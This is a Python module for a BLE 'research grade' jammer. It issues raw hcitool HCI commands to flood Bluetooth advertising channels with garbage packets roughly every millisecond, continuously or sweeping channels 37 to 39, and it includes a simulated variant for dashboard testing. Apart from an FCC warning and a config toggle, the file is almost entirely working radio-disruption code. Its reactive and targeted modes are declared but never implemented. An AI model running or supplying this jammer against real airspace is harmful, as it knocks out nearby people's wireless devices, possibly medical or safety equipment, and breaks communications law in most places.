"""
BlueShield Bluetooth Jammer Module (Research Grade)

WARNING: Bluetooth jamming is regulated by the FCC and equivalent agencies worldwide.
This module is intended ONLY for:
  - Authorized penetration testing
  - Academic/security research in controlled environments
  - Defensive security testing with proper authorization

Uses HCI commands to send rapid advertisement packets on BLE channels,
effectively disrupting nearby BLE communications within a limited range.

Requires: Linux with BlueZ, root privileges, compatible BT adapter.
"""

import subprocess
import time
import threading
from datetime import datetime, timezone
from dataclasses import dataclass, field
from enum import Enum


class JamMode(Enum):
    REACTIVE = "reactive"       # Jam when unknown device detected
    CONTINUOUS = "continuous"    # Continuous jamming on target channels
    TARGETED = "targeted"       # Jam specific device address
    SWEEP = "sweep"             # Sweep across all BLE channels


@dataclass
class JamSession:
    """Tracks a jamming session."""
    session_id: int
    mode: str
    channel: int
    target: str = ""
    start_time: str = ""
    end_time: str = ""
    packets_sent: int = 0
    is_active: bool = False


class BluetoothJammer:
    """BLE jammer using HCI low-level commands for research purposes."""

    BLE_ADV_CHANNELS = [37, 38, 39]

    def __init__(self, config: dict):
        self.config = config
        self.interface = config.get("interface", "hci0")
        self.power = config.get("jam_power", -20)
        self.is_jamming = False
        self.sessions: list[JamSession] = []
        self.session_count = 0
        self._jam_thread: threading.Thread | None = None
        self._stop_event = threading.Event()

    def _hci_cmd(self, cmd: str, timeout: int = 5) -> str:
        """Execute an HCI command."""
        try:
            result = subprocess.run(
                cmd.split(),
                capture_output=True, text=True, timeout=timeout
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError):
            return ""

    def _set_adv_params(self, channel: int):
        """Set BLE advertising parameters for jamming."""
        # Map channel to channel map bitmask
        chan_map = {37: "01", 38: "02", 39: "04"}
        ch = chan_map.get(channel, "07")  # default all channels

        # HCI LE Set Advertising Parameters
        # Min interval: 0x0020 (20ms), Max interval: 0x0020
        # Type: ADV_NONCONN_IND (0x03) - non-connectable
        self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x0006 20 00 20 00 03 00 00 00 00 00 00 00 00 {ch} 00")

    def _set_adv_data(self, data: str = ""):
        """Set advertising data payload."""
        if not data:
            # Default: maximum length garbage data to maximize channel occupation
            data = "1F FF FF FF" + " FF" * 27
        self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x0008 {data}")

    def _start_adv(self):
        """Enable BLE advertising."""
        self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 01")

    def _stop_adv(self):
        """Disable BLE advertising."""
        self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 00")

    def _jam_loop_continuous(self, channel: int):
        """Continuous jamming on a single channel."""
        self._set_adv_params(channel)
        self._set_adv_data()
        self._start_adv()
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            # Rapidly toggle advertising to maximize disruption
            self._stop_adv()
            self._set_adv_data()
            self._start_adv()
            if session:
                session.packets_sent += 1
            time.sleep(0.001)  # ~1ms between packets

        self._stop_adv()

    def _jam_loop_sweep(self):
        """Sweep across all BLE advertising channels."""
        session = self.sessions[-1] if self.sessions else None

        while not self._stop_event.is_set():
            for channel in self.BLE_ADV_CHANNELS:
                if self._stop_event.is_set():
                    break
                self._stop_adv()
                self._set_adv_params(channel)
                self._set_adv_data()
                self._start_adv()
                if session:
                    session.packets_sent += 1
                time.sleep(0.002)

        self._stop_adv()

    def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
        """Start a jamming session."""
        if self.is_jamming:
            return self.sessions[-1]

        if not self.config.get("jam_enabled", False):
            raise RuntimeError("Jamming is disabled in config. Set jam_enabled=True for research use.")

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        # Bring interface up
        self._hci_cmd(f"hciconfig {self.interface} up")

        if mode == "sweep":
            self._jam_thread = threading.Thread(target=self._jam_loop_sweep, daemon=True)
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True
            )
        self._jam_thread.start()
        return session

    def stop_jam(self) -> JamSession | None:
        """Stop the current jamming session."""
        if not self.is_jamming:
            return None

        self._stop_event.set()
        if self._jam_thread:
            self._jam_thread.join(timeout=5)

        self._stop_adv()
        self.is_jamming = False

        if self.sessions:
            session = self.sessions[-1]
            session.is_active = False
            session.end_time = datetime.now(timezone.utc).isoformat()
            return session
        return None

    def get_status(self) -> dict:
        """Get jammer status."""
        active_session = None
        if self.sessions and self.sessions[-1].is_active:
            s = self.sessions[-1]
            active_session = {
                "session_id": s.session_id,
                "mode": s.mode,
                "channel": s.channel,
                "target": s.target,
                "start_time": s.start_time,
                "packets_sent": s.packets_sent,
            }
        return {
            "is_jamming": self.is_jamming,
            "jam_enabled": self.config.get("jam_enabled", False),
            "total_sessions": len(self.sessions),
            "active_session": active_session,
        }


class SimulatedJammer(BluetoothJammer):
    """Simulated jammer for dashboard testing without hardware."""

    def _jam_loop_continuous(self, channel: int):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def _jam_loop_sweep(self):
        session = self.sessions[-1] if self.sessions else None
        while not self._stop_event.is_set():
            if session:
                session.packets_sent += 1
            time.sleep(0.01)

    def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
        if self.is_jamming:
            return self.sessions[-1]

        self.session_count += 1
        session = JamSession(
            session_id=self.session_count,
            mode=mode,
            channel=channel,
            target=target,
            start_time=datetime.now(timezone.utc).isoformat(),
            is_active=True,
        )
        self.sessions.append(session)
        self.is_jamming = True
        self._stop_event.clear()

        if mode == "sweep":
            self._jam_thread = threading.Thread(target=self._jam_loop_sweep, daemon=True)
        else:
            self._jam_thread = threading.Thread(
                target=self._jam_loop_continuous, args=(channel,), daemon=True
            )
        self._jam_thread.start()
        return session
